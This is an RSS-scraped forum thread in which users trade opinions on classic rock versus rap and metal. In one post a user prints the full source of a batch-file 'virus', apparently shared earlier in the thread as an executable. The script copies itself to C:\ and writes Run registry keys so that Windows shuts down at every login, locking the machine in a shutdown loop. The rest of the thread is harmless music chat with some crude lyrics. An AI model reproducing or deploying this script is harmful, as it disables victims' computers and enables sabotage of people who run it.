channel.title: Classic rock. The lost
channel.description:
Yes. The older rock. About love, and it had meaning.
Discuss. My personnal favorites were,
Warrent Whitesnake Def Lepperd Aerosmith (toys in the attic album.. 100/10) Quiet Riot Pink Floyd Rush
I dont know about you, but I miss them. They had meaning, skill on guitars, and you felt the music. Now its to electronica, and not real. Its all gangster rap, or that "So-Called metal" or EMO.
Flame me if you want, but IMO its the truth.

item.title: Classic rock. The lost
item.dc:creator: @Ron Ron
item.description:
@Ron wrote:

1337h4x:

I HATE RAP. RAP sucks. Period.

Yay!

On another topic

I totally agree. I pretty much only listen to music made before the 90’s.

Yay!

tomo6627:

Yeah, just restating what everyone here has said-Classic rock=amazing people who made music to make music, Rap=people who just want money…and large diamonds…

Yay!

lol, yeah classic rock rules. If you ever take a girl out, never play a rap song… especially that song that’slike… I wanna fuck you… I wanna feel you… I want you… lol my friend played that song and the girl was like, take me home.

Classic rock is definitely where it’s at, and hopefully the next generation will appreciate it more and we can have the good life of the rock n roll days again… without the war.

Read full topic

item.title: Classic rock. The lost
item.dc:creator: @1337h4x 1337h4x
item.description:
@1337h4x wrote:

I like pink floyd.[quote=“Alex Owns, post:6, topic:12461”]Classic rock isn’t as hardcore as I would like it, like slayer.

Classic rock gives me the feeling of pop music, which I hate.[/quote]

Same here. Pink floyd is ok, and so is Deep purple ( <3 smoke on the water ),
but Metallica just…well…feels more like…well…not like pop.

I HATE RAP. RAP sucks. Period.

Read full topic

item.title: Classic rock. The lost
item.dc:creator: @Aftermath.v2 Aftermath.v2
item.description:
@Aftermath.v2 wrote:

[quote=“Alex Owns, post:11, topic:12461”]Aftermath, just to tell you…

When his so called “virus” link was available…I downloaded it, on some crappy test computer. It made no system changes, didn’t hurt anything, did not make any new files, did not delete anything. So it was a hoax maybe?[/quote]

No. It’s been confirmed by me and someone else.

This was the source, and it was just compiled into an exe with some batch-to-exe program.

@ECHO off 
CLS 
COPY %0 C:\%0_1.bat
ECHO REGEDIT4 >> temp.reg 
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg 
ECHO "ownage"="shutdown.exe -s -t 00" >> temp.reg 
ECHO [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg
ECHO "ownage"="shutdown.exe -s -t 00" >> temp.reg 
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg 
ECHO "backup1"="C:\%0_1.bat" >> temp.reg
REGEDIT.EXE /s temp.reg 
SHUTDOWN.EXE -s -t 00

This code is by suck my r2h. Don’t use it though.

Read full topic

item.title: Classic rock. The lost
item.dc:creator: @Cheesehunk Cheesehunk
item.description:
@Cheesehunk wrote:

I agree with Ron, and pko. Music used to have meaning. Remember Hotel California, and Stairway to heaven? What about The Artists Fleetwood Mac? Tom Petty, Lynard Skynard? Nazareth? And all the ones you guys mentioned, plus more. Music is crap nowadays, the singers don’t write there own songs, infact, we are lucky if they actually sing them as well. You never hear classic Guitar solos without screaming anymore…

Classic rock is the best of all Music.

Read full topic

Steve Miller Band had a lot of meaning, same with Billy Joel, Aerosmith, the Beatles, Led Zeppelin, Clash, Boston, and many others.

Yes. The older rock. About love, and it had meaning.

I dont know about you, but I miss them. They had meaning, skill on guitars, and you felt the music. Now its to electronica, and not real. Its all gangster rap, or that “So-Called metal” or EMO.
